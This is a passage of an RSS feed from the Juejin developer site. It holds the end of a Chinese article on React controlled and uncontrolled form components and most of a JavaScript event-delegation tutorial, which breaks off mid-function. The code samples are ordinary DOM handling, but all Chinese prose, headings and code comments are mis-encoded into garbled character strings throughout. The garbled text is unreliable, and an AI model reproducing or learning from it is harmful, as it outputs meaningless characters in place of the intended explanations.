<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹å¼</th><th>ç†ç”±</th></tr></thead><tbody><tr><td>ç™»å½•/æ³¨å†Œ</td><td>å—æ§ç»„ä»¶</td><td>éœ€è¦æ ¡éªŒã€è”åŠ¨ã€é”™è¯¯æç¤º</td></tr><tr><td>è¯„è®º/ç•™è¨€</td><td>éå—æ§ç»„ä»¶</td><td>ä¸€æ¬¡æ€§æäº¤ï¼Œæ— éœ€å®æ—¶å¤„ç†</td></tr><tr><td>æ–‡ä»¶ä¸Šä¼ </td><td>éå—æ§ç»„ä»¶</td><td>DOM å†…éƒ¨çŠ¶æ€å¤æ‚ï¼Œä¸é€‚åˆ React ç®¡ç†</td></tr><tr><td>å®æ—¶æœç´¢</td><td>å—æ§ç»„ä»¶</td><td>éœ€è¦å³æ—¶åé¦ˆç»“æœ</td></tr><tr><td>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨</td><td>éå—æ§ç»„ä»¶</td><td>ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼Œå†…éƒ¨çŠ¶æ€ç‹¬ç«‹</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">å…­ã€æœ€åçš„æ€è€ƒï¼šReact çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>React çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>UI æ˜¯çŠ¶æ€çš„å‡½æ•°</strong>ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé¡µé¢é•¿ä»€ä¹ˆæ ·ï¼Œå®Œå…¨å–å†³äºå½“å‰çš„çŠ¶æ€ã€‚</p>
<p>å½“ä½ ä½¿ç”¨å—æ§ç»„ä»¶æ—¶ï¼Œä½ æ˜¯åœ¨è·µè¡Œè¿™ä¸€ç†å¿µï¼š<strong>æ¯ä¸€ä¸ªå˜åŒ–ï¼Œéƒ½æ˜¯çŠ¶æ€é©±åŠ¨çš„ç»“æœ</strong>ã€‚</p>
<p>è€Œå½“ä½ ä½¿ç”¨éå—æ§ç»„ä»¶æ—¶ï¼Œä½ å®é™…ä¸Šæ˜¯åœ¨è¯´ï¼šâ€œè¿™ä¸ªéƒ¨åˆ†æˆ‘æš‚æ—¶ä¸æƒ³ç®¡ï¼Œè®©å®ƒè‡ªå·±ç©ã€‚â€</p>
<p>è¿™ä¸æ˜¯åäº‹ï¼Œä½†ä½ è¦æ¸…æ¥šåœ°çŸ¥é“ï¼š<strong>ä½ åœ¨æ”¾å¼ƒä¸€éƒ¨åˆ†æ§åˆ¶æƒã€‚</strong></p>
<p>æ‰€ä»¥ï¼Œä¸è¦ä¸ºäº†â€œç®€æ´â€è€Œæ»¥ç”¨éå—æ§ç»„ä»¶ï¼Œä¹Ÿä¸è¦ä¸ºäº†â€œè§„èŒƒâ€è€Œè¿‡åº¦ä½¿ç”¨å—æ§ç»„ä»¶ã€‚</p>
<p>æˆ‘ä»¬åº”è¯¥è¦åœ¨â€œæ§åˆ¶â€ä¸â€œæ”¾æ‰‹â€ä¹‹é—´æ‰¾åˆ°å¹³è¡¡ç‚¹ã€‚</p>
<hr/>
<h2 data-id="heading-7">å†™åœ¨æœ€å</h2>
<p>æŠ€æœ¯æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œåªæœ‰åˆé€‚çš„æ—¶æœºã€‚</p>
<p>ä¸‹æ¬¡é¢å¯¹ä¸€ä¸ªè¡¨å•æ—¶ï¼Œå¯ä»¥å…ˆæƒ³æƒ³</p>
<blockquote>
<p>â€œæˆ‘éœ€è¦åœ¨ç”¨æˆ·è¾“å…¥çš„è¿‡ç¨‹ä¸­åšä»€ä¹ˆï¼Ÿâ€</p>
</blockquote>
<p>å¦‚æœç­”æ¡ˆæ˜¯â€œä»€ä¹ˆä¹Ÿä¸åšâ€ï¼Œé‚£å°±æ”¾æ‰‹å§ã€‚(useRef)<br/>
å¦‚æœç­”æ¡ˆæ˜¯â€œæˆ‘è¦æ ¡éªŒã€è”åŠ¨ã€å±•ç¤ºâ€ï¼Œé‚£å°±ç‰¢ç‰¢æŠ“ä½å®ƒã€‚(useState)</p>
<p>è¿™æ‰æ˜¯ React è¡¨å•è®¾è®¡çš„çœŸæ­£æ™ºæ…§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åƒé€ JS äº‹ä»¶å§”æ‰˜ï¼šä»åŸç†åˆ°å®æˆ˜ï¼Œè§£é”é«˜æ€§èƒ½äº‹ä»¶å¤„ç†æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7590020026394492982</link>    <guid>https://juejin.cn/post/7590020026394492982</guid>    <pubDate>2026-01-02T06:56:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026394492982" data-draft-id="7589623325975953460" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åƒé€ JS äº‹ä»¶å§”æ‰˜ï¼šä»åŸç†åˆ°å®æˆ˜ï¼Œè§£é”é«˜æ€§èƒ½äº‹ä»¶å¤„ç†æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T06:56:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸æƒ³ç§ƒå¤´çš„ç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/2754702534251820"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åƒé€ JS äº‹ä»¶å§”æ‰˜ï¼šä»åŸç†åˆ°å®æˆ˜ï¼Œè§£é”é«˜æ€§èƒ½äº‹ä»¶å¤„ç†æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2754702534251820/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸æƒ³ç§ƒå¤´çš„ç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:56:37.000Z" title="Fri Jan 02 2026 06:56:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>äº‹ä»¶å§”æ‰˜ï¼ˆEvent Delegationï¼‰æ˜¯ JavaScript ä¸­æœ€æ ¸å¿ƒçš„äº‹ä»¶å¤„ç†æŠ€å·§ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯å‰ç«¯é¢è¯•çš„é«˜é¢‘è€ƒç‚¹ã€‚å®ƒåŸºäºäº‹ä»¶å†’æ³¡æœºåˆ¶ï¼Œèƒ½å¤§å¹…å‡å°‘äº‹ä»¶ç»‘å®šæ•°é‡ã€è§£å†³åŠ¨æ€å…ƒç´ äº‹ä»¶å¤±æ•ˆé—®é¢˜ï¼ŒåŒæ—¶é™ä½å†…å­˜å ç”¨ã€æå‡é¡µé¢æ€§èƒ½ã€‚æœ¬æ–‡å°†ä»åŸç†æ‹†è§£ã€å®æˆ˜åœºæ™¯ã€æ€§èƒ½ä¼˜åŒ–åˆ°é¿å‘æŒ‡å—ï¼Œå…¨æ–¹ä½å¸¦ä½ åƒé€äº‹ä»¶å§”æ‰˜ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦äº‹ä»¶å§”æ‰˜ï¼Ÿå…ˆçœ‹ç—›ç‚¹</h2>
<p>åœ¨æœªä½¿ç”¨äº‹ä»¶å§”æ‰˜çš„åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šç»™æ¯ä¸ªå…ƒç´ å•ç‹¬ç»‘å®šäº‹ä»¶ï¼Œæ¯”å¦‚ä¸€ä¸ªåˆ—è¡¨çš„æ‰€æœ‰é¡¹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼šç»™æ¯ä¸ªliç»‘å®šç‚¹å‡»äº‹ä»¶</span>
<span class="hljs-keyword">const</span> items = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.list-item'</span>);
items.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
  item.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç‚¹å‡»äº†åˆ—è¡¨é¡¹ï¼š'</span>, item.<span class="hljs-property">textContent</span>);
  });
});
</code></pre>
<p>è¿™ç§å†™æ³•ä¼šæš´éœ²ä¸‰ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š</p>
<ol>
<li><strong>æ€§èƒ½æŸè€—</strong>ï¼šå¦‚æœåˆ—è¡¨æœ‰ 1000 ä¸ªé¡¹ï¼Œå°±ä¼šåˆ›å»º 1000 ä¸ªäº‹ä»¶å¤„ç†å‡½æ•°ï¼Œå ç”¨å¤§é‡å†…å­˜ï¼›</li>
<li><strong>åŠ¨æ€å…ƒç´ å¤±æ•ˆ</strong>ï¼šæ–°å¢çš„åˆ—è¡¨é¡¹ï¼ˆå¦‚é€šè¿‡ JS åŠ¨æ€æ·»åŠ ï¼‰ä¸ä¼šè‡ªåŠ¨ç»‘å®šäº‹ä»¶ï¼Œéœ€è¦é‡æ–°æ‰§è¡Œç»‘å®šé€»è¾‘ï¼›</li>
<li><strong>ä»£ç å†—ä½™</strong>ï¼šé‡å¤çš„äº‹ä»¶ç»‘å®šé€»è¾‘ï¼Œå¢åŠ ç»´æŠ¤æˆæœ¬ã€‚</li>
</ol>
<p>è€Œäº‹ä»¶å§”æ‰˜èƒ½ä¸€æ¬¡æ€§è§£å†³è¿™äº›é—®é¢˜ â€”â€” åªç»™çˆ¶å…ƒç´ ç»‘å®šä¸€æ¬¡äº‹ä»¶ï¼Œå°±èƒ½å¤„ç†æ‰€æœ‰å­å…ƒç´ çš„äº‹ä»¶è§¦å‘ã€‚</p>
<h2 data-id="heading-1">äºŒã€äº‹ä»¶å§”æ‰˜çš„æ ¸å¿ƒåŸç†ï¼šäº‹ä»¶æµ</h2>
<p>è¦ç†è§£äº‹ä»¶å§”æ‰˜ï¼Œå¿…é¡»å…ˆæŒæ¡ DOM äº‹ä»¶æµçš„ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ•è·é˜¶æ®µ</strong>ï¼šäº‹ä»¶ä» window å‘ä¸‹ä¼ æ’­åˆ°ç›®æ ‡å…ƒç´ ï¼ˆä»å¤–åˆ°å†…ï¼‰ï¼›</li>
<li><strong>ç›®æ ‡é˜¶æ®µ</strong>ï¼šäº‹ä»¶åˆ°è¾¾ç›®æ ‡å…ƒç´ æœ¬èº«ï¼›</li>
<li><strong>å†’æ³¡é˜¶æ®µ</strong>ï¼šäº‹ä»¶ä»ç›®æ ‡å…ƒç´ å‘ä¸Šä¼ æ’­å› windowï¼ˆä»å†…åˆ°å¤–ï¼‰ã€‚</li>
</ol>
<p>äº‹ä»¶å§”æ‰˜çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š<strong>åˆ©ç”¨äº‹ä»¶å†’æ³¡ï¼Œå°†å­å…ƒç´ çš„äº‹ä»¶ç»‘å®šåˆ°çˆ¶å…ƒç´ ï¼ˆç”šè‡³æ ¹å…ƒç´ ï¼‰ä¸Šï¼Œé€šè¿‡åˆ¤æ–­äº‹ä»¶æºï¼ˆtargetï¼‰æ¥åŒºåˆ†å…·ä½“è§¦å‘çš„å­å…ƒç´ </strong>ã€‚</p>
<p>ä¸¾ä¸ªç›´è§‚çš„ä¾‹å­ï¼šç‚¹å‡»åˆ—è¡¨ä¸­çš„<code>&lt;li&gt;</code>ï¼Œäº‹ä»¶ä¼šå…ˆè§¦å‘<code>&lt;li&gt;</code>çš„ click äº‹ä»¶ï¼Œç„¶åå†’æ³¡åˆ°<code>&lt;ul&gt;</code>ã€<code>&lt;div&gt;</code>ï¼Œç›´åˆ°<code>document</code>å’Œ<code>window</code>ã€‚æˆ‘ä»¬åªéœ€è¦åœ¨<code>&lt;ul&gt;</code>ä¸Šç»‘å®šä¸€æ¬¡äº‹ä»¶ï¼Œå°±èƒ½æ•è·æ‰€æœ‰<code>&lt;li&gt;</code>çš„ç‚¹å‡»è¡Œä¸ºã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€åŸºç¡€å®æˆ˜ï¼šå®ç°ä¸€ä¸ªåˆ—è¡¨çš„äº‹ä»¶å§”æ‰˜</h2>
<h3 data-id="heading-3">1. æ ¸å¿ƒå®ç°ä»£ç </h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"list"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"item-list"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>åˆ—è¡¨é¡¹1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"2"</span>&gt;</span>åˆ—è¡¨é¡¹2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"3"</span>&gt;</span>åˆ—è¡¨é¡¹3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"addItem"</span>&gt;</span>æ–°å¢åˆ—è¡¨é¡¹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// çˆ¶å…ƒç´ ç»‘å®šäº‹ä»¶ï¼ˆåªç»‘å®šä¸€æ¬¡ï¼‰</span>
<span class="hljs-keyword">const</span> list = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'list'</span>);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// æ ¸å¿ƒï¼šåˆ¤æ–­è§¦å‘äº‹ä»¶çš„ç›®æ ‡å…ƒç´ </span>
  <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>;
  <span class="hljs-comment">// ç¡®è®¤ç‚¹å‡»çš„æ˜¯åˆ—è¡¨é¡¹ï¼ˆé¿å…ç‚¹å‡»ulç©ºç™½å¤„è§¦å‘ï¼‰</span>
  <span class="hljs-keyword">if</span> (target.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'list-item'</span>)) {
    <span class="hljs-keyword">const</span> id = target.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç‚¹å‡»äº†åˆ—è¡¨é¡¹<span class="hljs-subst">${id}</span>ï¼š`</span>, target.<span class="hljs-property">textContent</span>);
  }
});

<span class="hljs-comment">// åŠ¨æ€æ–°å¢åˆ—è¡¨é¡¹ï¼ˆæ— éœ€é‡æ–°ç»‘å®šäº‹ä»¶ï¼‰</span>
<span class="hljs-keyword">const</span> addItem = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'addItem'</span>);
<span class="hljs-keyword">let</span> index = <span class="hljs-number">4</span>;
addItem.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> li = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'li'</span>);
  li.<span class="hljs-property">className</span> = <span class="hljs-string">'list-item'</span>;
  li.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span> = index;
  li.<span class="hljs-property">textContent</span> = <span class="hljs-string">`åˆ—è¡¨é¡¹<span class="hljs-subst">${index}</span>`</span>;
  list.<span class="hljs-title function_">appendChild</span>(li);
  index++;
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-4">2. å…³é”®çŸ¥è¯†ç‚¹è§£æ</h3>
<ul>
<li><strong>e.target</strong>ï¼šè§¦å‘äº‹ä»¶çš„åŸå§‹å…ƒç´ ï¼ˆæ¯”å¦‚ç‚¹å‡»çš„<code>&lt;li&gt;</code>ï¼‰ï¼›</li>
<li><strong>e.currentTarget</strong>ï¼šç»‘å®šäº‹ä»¶çš„å…ƒç´ ï¼ˆè¿™é‡Œæ˜¯<code>&lt;ul&gt;</code>ï¼‰ï¼›</li>
<li><strong>ç±»å / å±æ€§åˆ¤æ–­</strong>ï¼šé€šè¿‡<code>classList</code>ã€<code>dataset</code>ç­‰æ–¹å¼ç²¾å‡†åŒ¹é…ç›®æ ‡å…ƒç´ ï¼Œé¿å…éç›®æ ‡å…ƒç´ è§¦å‘é€»è¾‘ï¼›</li>
<li><strong>åŠ¨æ€å…ƒç´ å…¼å®¹</strong>ï¼šæ–°å¢çš„<code>&lt;li&gt;</code>æ— éœ€é‡æ–°ç»‘å®šäº‹ä»¶ï¼Œå› ä¸ºäº‹ä»¶å§”æ‰˜åœ¨çˆ¶å…ƒç´ ä¸Šï¼Œå¤©ç„¶æ”¯æŒåŠ¨æ€å…ƒç´ ã€‚</li>
</ul>
<h2 data-id="heading-5">å››ã€è¿›é˜¶åœºæ™¯ï¼šç²¾ç»†åŒ–äº‹ä»¶å§”æ‰˜</h2>
<p>å®é™…å¼€å‘ä¸­ï¼Œäº‹ä»¶å§”æ‰˜çš„åœºæ™¯å¾€å¾€æ›´å¤æ‚ï¼Œæ¯”å¦‚å¤šå±‚åµŒå¥—ã€å¤šç±»å‹äº‹ä»¶ã€éœ€è¦é˜»æ­¢å†’æ³¡ç­‰ï¼Œä»¥ä¸‹æ˜¯é«˜é¢‘è¿›é˜¶ç”¨æ³•ï¼š</p>
<h3 data-id="heading-6">1. å¤šå±‚åµŒå¥—å…ƒç´ çš„å§”æ‰˜</h3>
<p>å½“ç›®æ ‡å…ƒç´ åµŒå¥—åœ¨å…¶ä»–å…ƒç´ ä¸­ï¼ˆæ¯”å¦‚<code>&lt;li&gt;</code>é‡Œæœ‰<code>&lt;span&gt;</code>ã€<code>&lt;button&gt;</code>ï¼‰ï¼Œéœ€è¦é€šè¿‡<code>closest</code>æ‰¾åˆ°æœ€å¤–å±‚çš„ç›®æ ‡å…ƒç´ ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"list"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>åˆ—è¡¨é¡¹1<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete-btn"</span>&gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> list = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'list'</span>);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// æ‰¾åˆ°æœ€è¿‘çš„list-itemï¼ˆè§£å†³ç‚¹å‡»å­å…ƒç´ è§¦å‘çš„é—®é¢˜ï¼‰</span>
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'.list-item'</span>);
  <span class="hljs-keyword">if</span> (item) {
    <span class="hljs-comment">// åŒºåˆ†ç‚¹å‡»çš„æ˜¯åˆ—è¡¨é¡¹è¿˜æ˜¯åˆ é™¤æŒ‰é’®</span>
    <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'delete-btn'</span>)) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`åˆ é™¤åˆ—è¡¨é¡¹<span class="hljs-subst">${item.dataset.id}</span>`</span>);
      item.<span class="hljs-title function_">remove</span>();
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç‚¹å‡»åˆ—è¡¨é¡¹<span class="hljs-subst">${item.dataset.id}</span>`</span>);
    }
  }
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>closest</code>æ–¹æ³•ä¼šä»å½“å‰å…ƒç´ å‘ä¸ŠæŸ¥æ‰¾ï¼Œè¿”å›åŒ¹é…é€‰æ‹©å™¨çš„ç¬¬ä¸€ä¸ªç¥–å…ˆå…ƒç´ ï¼ˆåŒ…æ‹¬è‡ªèº«ï¼‰ï¼Œæ˜¯å¤„ç†åµŒå¥—å…ƒç´ çš„æœ€ä½³æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-7">2. å¤šç±»å‹äº‹ä»¶çš„ç»Ÿä¸€å§”æ‰˜</h3>
<p>å¯ä»¥åœ¨çˆ¶å…ƒç´ ä¸Šç»‘å®šå¤šä¸ªäº‹ä»¶ç±»å‹ï¼Œæˆ–é€šè¿‡ä¸€ä¸ªå¤„ç†å‡½æ•°åŒºåˆ†ä¸åŒäº‹ä»¶ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸€ä¸ªå¤„ç†å‡½æ•°å¤„ç†å¤šä¸ªäº‹ä»¶ç±»å‹</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleItemEvent);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, handleItemEvent);
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseleave'</span>, handleItemEvent);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleItemEvent</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'.list-item'</span>);
  <span class="hljs-keyword">if</span> (!item) <span class="hljs-keyword">return</span>;

